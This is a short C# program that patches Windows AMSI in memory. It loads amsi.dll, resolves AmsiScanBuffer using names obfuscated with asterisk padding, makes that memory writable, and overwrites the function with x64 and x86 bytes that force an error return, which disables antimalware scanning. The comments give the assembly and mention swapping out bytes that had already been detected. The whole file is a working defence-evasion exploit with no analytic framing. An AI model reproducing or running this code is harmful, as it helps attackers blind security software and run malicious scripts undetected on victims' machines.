using System;
using System.Runtime.InteropServices;

public class amsi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    private static string gklpoiu = "a*m*s*i.*********************dl******l*".Replace("*", "");
    private static string msasbnc = "A**m*siS**c*a*******n*Buf*f*er".Replace("*", "");

    [STAThread]
    public static void Main()
    {
        IntPtr zkqru = LoadLibrary(gklpoiu);
        IntPtr xntwkmv = GetProcAddress(zkqru, msasbnc);
        byte[] ltrhpjt = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x08, 0xFF, 0xE0 } :
            new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x58, 0x83, 0xC4, 0x18, 0xFF, 0xE0 }; //32 bit patch bytes was detected had to update it 



        // x64 assembly
        // mov eax, 0x80070057
        //  mov rax, [rsp]
        //  add rsp, 8
        //  jmp rax




        //x86 assembly 

        //mov eax, 0x80070057
        //pop eax 
        //add esp, 0x18
        //jmp eax


        uint pvrloq;
        if (!VirtualProtect(xntwkmv, (UIntPtr)ltrhpjt.Length, PAGE_EXECUTE_READWRITE, out pvrloq))
        {
            return;
        }
        Marshal.Copy(ltrhpjt, 0, xntwkmv, ltrhpjt.Length);
        VirtualProtect(xntwkmv, (UIntPtr)ltrhpjt.Length, pvrloq, out pvrloq);
    }
}